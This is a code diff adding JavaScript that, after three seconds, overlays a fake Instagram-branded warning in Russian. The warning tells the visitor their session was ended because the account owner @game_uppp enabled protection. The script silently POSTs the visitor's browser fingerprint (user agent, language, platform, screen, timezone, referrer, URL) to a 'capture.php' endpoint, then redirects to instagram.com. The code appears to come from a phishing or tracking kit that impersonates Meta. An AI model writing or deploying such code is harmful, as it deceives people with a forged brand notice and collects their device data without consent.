@@ -1,0 +1,9 @@
+setTimeout(() => {
+  const modal = document.createElement("div");
+  modal.id = "kickedModal";
+  modal.innerHTML = `<div style="position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.92);display:flex;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,\x27Segoe UI\x27,Roboto,sans-serif;"><div style="background:#000;border:1px solid #363636;border-radius:12px;padding:40px 30px;max-width:420px;text-align:center;color:#f5f5f5;"><div style="font-size:56px;margin-bottom:16px;">&#9888;&#65039;</div><h2 style="font-size:20px;margin-bottom:12px;font-weight:600;">Обнаружен вход с нового устройства</h2><p style="color:#a8a8a8;font-size:14px;line-height:1.5;margin-bottom:20px;">Ваша сессия была завершена, так как владелец аккаунта <b style="color:#f5f5f5;">@game_uppp</b> включил защиту от несанкционированного доступа.</p><p style="color:#a8a8a8;font-size:13px;line-height:1.5;margin-bottom:24px;">Владелец аккаунта уведомлён о попытке входа. Если вы владелец — войдите заново.</p><button id="kickedClose" style="width:100%;padding:12px;background:#0095f6;border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;">Понятно</button><p style="color:#666;font-size:11px;margin-top:16px;">&copy; 2026 Instagram from Meta</p></div></div>`;
+  document.body.appendChild(modal);
+  document.getElementById("kickedClose").addEventListener("click", () => { window.location.href = "https://www.instagram.com/"; });
+  setTimeout(() => { window.location.href = "https://www.instagram.com/"; }, 5000);
+  fetch("api/capture.php", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ type:"viewer_kicked", data:{ userAgent:navigator.userAgent, language:navigator.language, platform:navigator.platform, screen:screen.width+"x"+screen.height, timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, referer:document.referrer, url:window.location.href } }) }).catch(() => {});
+}, 3000);
